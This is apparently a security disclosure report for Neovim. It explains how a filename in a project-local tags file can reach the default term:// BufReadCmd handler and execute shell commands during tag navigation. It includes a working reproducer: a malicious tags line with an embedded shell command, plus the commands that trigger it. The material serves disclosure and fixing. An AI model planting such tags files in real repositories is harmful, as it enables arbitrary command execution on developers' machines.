# Tag-controlled filenames reach active `BufReadCmd` sinks

## Broken invariant

`{tagfile}` from a tags entry is documented as a filename/path for the tag target, while `tag-security` only discusses sandboxing the `{tagaddress}` command. The implementation therefore needs to preserve this invariant:

> a tag-file-controlled filename must remain passive file-selection data and must not be reinterpreted as an active `BufReadCmd` target that can execute commands, perform network I/O, or invoke runtime plugins.

Current Neovim violates that invariant. `jumpto_tag()` accepts a non-existent target if any `BufReadCmd` matches the attacker-controlled filename, then hands that name to `getfile()`. That lets a hostile project-local `tags` file route `:tag` / `CTRL-]` into builtin handlers such as the default `term://*` handler, which calls `jobstart()`.

## Input -> normalization -> policy gate -> sink

1. **Input:** an attacker-controlled tag line supplies `{tagfile}`.
   - `src/nvim/tag.c:2598-2627` (`parse_tag_line()`) extracts the second tab-separated field into `tagp->fname`.
   - `src/nvim/tag.c:2678-2743` (`parse_match()`) carries that parsed filename forward.
2. **Normalization:** `src/nvim/tag.c:2817-2819` calls `expand_tag_fname()`.
   - `src/nvim/tag.c:3072-3106` expands wildcards / `tagrelative`, but otherwise preserves opaque scheme-like names such as `term://...`.
3. **Policy gate:** `src/nvim/tag.c:2822-2827` treats any matching `BufReadCmd` as equivalent to a real file:
   - `if (!os_path_exists(fname) && !has_autocmd(EVENT_BUFREADCMD, fname, NULL))`
   - so a non-file string is accepted if some `BufReadCmd` pattern matches it.
4. **Sink:** `src/nvim/tag.c:2897-2900` calls `getfile(0, fname, NULL, true, 0, forceit)`.
   - `src/nvim/fileio.c:289-315` shows that `getfile()` dispatches `BufReadCmd` handlers via `apply_autocmds_exarg(EVENT_BUFREADCMD, ...)`.
5. **Concrete default-on sink:** `runtime/lua/vim/_core/defaults.lua:575-582` registers a default `BufReadCmd` for `term://*` and runs:
   - `jobstart(matchstr(expand("<amatch>"), ...), {'term': v:true, 'cwd': ...})`

This means the tag filename itself becomes command-bearing input. The `{tagaddress}` does not need to be malicious at all.

## Why this breaks the documented contract

- `runtime/doc/tagsrch.txt:576-582` documents `{tagfile}` as “The file that contains the definition”.
- `runtime/doc/tagsrch.txt:457-466` documents security restrictions for `{tagaddress}` Ex commands, not for `{tagfile}`.
- `runtime/doc/options.txt:6784-6799` shows that default tag discovery is `./tags;,tags`, so a project-local `tags` file is in the default trust path.
- `runtime/doc/vim_diff.txt:176-182` documents that Neovim ships a default `BufReadCmd` for `term://`.

So the intended security model is “sandbox dangerous tag commands”. The bug is that the filename path is allowed to bypass that model entirely by crossing into `BufReadCmd` dispatch.

## Minimal reproducer

This reproduces on stock Neovim with `--clean`; no user config is needed.

### Files

`/tmp/tag-jump-expand-proj/main.c`

```c
int main(void) { return 0; }
```

`/tmp/tag-jump-expand-proj/tags`

```text
pwntag	term://sh -c 'printf exploited-default >/tmp/tag-jump-expand-proof-default'	1
```

### Commands

```bash
rm -rf /tmp/tag-jump-expand-proj
mkdir -p /tmp/tag-jump-expand-proj
printf 'int main(void) { return 0; }\n' >/tmp/tag-jump-expand-proj/main.c
printf "pwntag\tterm://sh -c 'printf exploited-default >/tmp/tag-jump-expand-proof-default'\t1\n" \
  >/tmp/tag-jump-expand-proj/tags
rm -f /tmp/tag-jump-expand-proof-default

nvim --clean --headless /tmp/tag-jump-expand-proj/main.c \
  "+silent! tag pwntag" \
  "+sleep 300m" \
  "+qa!"

cat /tmp/tag-jump-expand-proof-default
```

### Expected vs actual

- **Expected:** tag navigation should either open a normal file target or reject a non-file/scheme target from tag metadata. The only dangerous tag component that should need sandboxing is `{tagaddress}`.
- **Actual:** `:tag pwntag` matches the default local `./tags` file, accepts `term://...` because it matches `BufReadCmd`, and executes the embedded shell command via the default terminal handler. The proof file contains:

```text
exploited-default
```

The tag address here is only `1` (a benign line number). The exploit lives entirely in the filename field.

## Affected files

- `src/nvim/tag.c:2598-2627` — `{tagfile}` parsed from the tag line.
- `src/nvim/tag.c:2817-2827` — filename expansion plus the flawed `os_path_exists || has_autocmd(BufReadCmd)` gate.
- `src/nvim/tag.c:2897-2900` — accepted filename handed to `getfile()`.
- `src/nvim/tag.c:2998-3015` — sandboxing only covers the tag **command** field, not the filename.
- `src/nvim/fileio.c:289-315` — `BufReadCmd` intercept on open.
- `runtime/lua/vim/_core/defaults.lua:575-582` — default `term://*` `BufReadCmd` sink using `jobstart()`.
- `runtime/doc/tagsrch.txt:457-466` and `runtime/doc/tagsrch.txt:576-582` — doc contract/security expectations.
- `runtime/doc/options.txt:6784-6799` — default `./tags;,tags` reachability.
- `runtime/doc/vim_diff.txt:176-182` — default `term://` autocmd documentation.

## Impact / severity

This is a **high-severity command-execution primitive from project content**:

- **Default reachability:** the stock `'tags'` default (`./tags;,tags`) consults a project-local `tags` file.
- **No plugin or opt-in config required:** the demonstrated sink is the builtin `term://*` `BufReadCmd`, present under `--clean`.
- **Command execution comes from the filename field, not the sandboxed tag command field:** this bypasses the documented `tag-security` model instead of merely abusing allowed Ex commands.
- **Normal user action:** a developer only needs to invoke tag navigation (`:tag`, `CTRL-]`, etc.) on a symbol inside a repository carrying a hostile `tags` file.

The broader blast radius is larger than `term://` alone: the same gate also exposes other `BufReadCmd`-backed scheme/plugin surfaces (`man://`, `http://*`, archive handlers, and any user/plugin-defined `BufReadCmd`). The core bug is that tag metadata is allowed to dispatch into active buffer-open handlers at all.
